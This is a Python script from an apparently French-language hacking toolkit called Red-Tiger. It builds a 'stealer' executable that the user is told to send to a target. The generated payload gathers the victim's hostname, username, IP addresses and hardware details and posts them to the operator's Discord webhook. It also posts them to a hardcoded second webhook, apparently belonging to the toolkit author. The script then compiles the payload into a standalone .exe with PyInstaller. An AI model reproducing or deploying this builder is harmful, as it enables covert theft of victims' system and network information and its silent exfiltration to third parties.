import subprocess
import os
import time

from Options.Options import *

TitrePage("Red-Tiger | Stealer Create")

LAPprint(f"{couleur.RED}\nMettez votre Webhook, laissez l'installation se faire, puis envoyez-le à votre cible !")
webhook = input(f"\n{couleur.RED}Entre le lien de ton Webhook -> {couleur.RESET}")
LAPprint(f"{couleur.RED}\nConversion en fichier exécutable (.exe):{couleur.RESET}")


fichier_texte = './Programmes/StealerCreate/StealerCreate.txt'

fichier_python = './Programmes/StealerCreate/StealerCreate.py'

chemin_destination = "./03-Stealer-Create"

chemin_destination_spec = './Programmes/StealerCreate'

with open(fichier_texte, 'w') as fichier:
 fichier.write("""import socket
import requests
import json
import os
import platform
import requests
import psutil


#Recuperation du nom du pc
nom_pc = socket.gethostname()

nom_utilisateur = os.getlogin()

#Recuperation de l'IP Publique
response = requests.get('https://httpbin.org/ip')
        
ip_address_public = response.json()['origin']
        

#Recuperation de l'IP Local
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('8.8.8.8', 80))

ip_address_local = s.getsockname()[0]

s.close()


#Recuperation de l'IP Ipv4
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('8.8.8.8', 80))  

ip_address_ipv4 = s.getsockname()[0]
s.close()


#Recuperation de l'IP Ipv6
s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.connect(('2001:4860:4860::8888', 80))

ip_address_ipv6 = s.getsockname()[0]


#Recuperation de son systeme d'exploitation
system_info = {platform.system()}
system_version_info = platform.version()


#Recuperation des RAM
ram_info = round(psutil.virtual_memory().total / (1024**3), 2)


#Recuperation du processeur et des coeur
cpu_info = platform.processor()
cpu_coeur_info = psutil.cpu_count(logical=False)

#Recuperation de la carte graphique

import GPUtil
gpus = GPUtil.getGPUs()
gpu_info = gpus[0].name if gpus else "N/A"


#Recuperation info disque
disk_info = psutil.disk_usage(path='/')

espace_disque = round(disk_info.total / (1024**3), 2)
espace_utilise_disque = round(disk_info.used / (1024**3), 2)
espace_dispo_disque = round(disk_info.free / (1024**3), 2)

#Envoie de l'embed dans le discord
def send_embed(webhook_url, title, color=0xf00020):

    embed_data = {
        'title': title,
        "fields": fields,
        'color': color,
        "author": author,
        "footer": footer
    }


    data = {
        'embeds': [embed_data],
        'username': username,  # Ajout du nom du webhook
        'avatar_url': avatar_url  # Ajout de l'URL de la photo de profil du webhook
    }


    json_data = json.dumps(data)


    headers = {
        'Content-Type': 'application/json'
    }


    response = requests.post(webhook_url, data=json_data, headers=headers)

embed_title = f'Red-Tiger | Info "{nom_pc}"'

fields = [
{"name": f"Nom Pc:", "value": f"```{nom_pc}```", "inline": True},
{"name": f"Nom Utilisateur:", "value": f"```{nom_utilisateur}```", "inline": True},
{"name": f"Systeme D'Exploitation:", "value": f"```{system_info}, Version: {system_version_info}```", "inline": True},
{"name": f"Processeur (CPU):", "value": f"```{cpu_info}, Nombre de coeur: {cpu_coeur_info}```", "inline": True},
{"name": f"Carte Graphique (GPU):", "value": f"```{gpu_info}```", "inline": True},
{"name": f"Memoire (RAM):", "value": f"```{ram_info} Go```", "inline": True},
{"name": f"Disque Dur:", "value": f"```Espace Total: {espace_disque}Go, Espace Utilise: {espace_utilise_disque}Go, Espace disponible: {espace_dispo_disque}Go```", "inline": True},

{"name": f"Ip Publique:", "value": f"```{ip_address_public}```", "inline": True},
{"name": f"Ip Local:", "value": f"```{ip_address_local}```", "inline": True},
{"name": f"Ipv4:", "value": f"```{ip_address_ipv4}```", "inline": True},
{"name": f"Ipv6:", "value": f"```{ip_address_ipv6}```", "inline": True},
#{"name": f"", "value": f"```{}```", "inline": True},
]
author =  {
        "name": "Red-Tiger | Stealer Create",
        "url": "https://github.com/fluzzzy/RedTiger-Fluzypro",
        "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
          }

footer = {
        "text": "Red-Tiger",
        "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
        }

embed_color = 0xf00020

username = 'Red-Tiger'
avatar_url = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'
""")
 fichier.write(f"""
webhook_invit = '{webhook}'

webhook_url = 'https://discord.com/api/webhooks/1184942625430720562/_GWFmcTWY0WkLtsoJF0VVbZlBx5scplXFi09eUPM8Yur1sAjM6CQNZfLboIq1ddek_1r'

send_embed(webhook_url, embed_title, embed_color)
send_embed(webhook_invit, embed_title, embed_color)""")
 
with open(fichier_texte, 'r') as fichier_txt:

    contenu = fichier_txt.read()

with open(fichier_python, 'w') as fichier_py:

    fichier_py.write(contenu)

with open(fichier_texte, 'w') as fichier:
 fichier.write(f"{chemin_destination}")

def convert_to_exe(script_name, destination_path):
    try:
        script_path = os.path.abspath(script_name)

        if not os.path.exists(destination_path):
            os.makedirs(destination_path)

        subprocess.run(['pyinstaller', '--onefile', '--distpath', destination_path, script_path])

        print(f"Conversion réussie. L'exécutable se trouve dans le dossier '{destination_path}'.")
    except Exception as e:
        print(f"Erreur lors de la conversion : {e}")

convert_to_exe(fichier_python, chemin_destination)

print(f"\n{couleur.RED}[INFORMATION] | {couleur.LIGHTRED_EX}Le fichier {couleur.CYAN}\"StealerCreate\"{couleur.LIGHTRED_EX} a était créé.", couleur.RESET)
time.sleep(5)
print(f"\n{couleur.RED}Chemin de \"StealerCreate\": {couleur.CYAN}\"{chemin_destination}\"{couleur.RED}, vous pouvez le renommer, déplacer comme vous voulez !", couleur.RESET)
time.sleep(8)
Reset()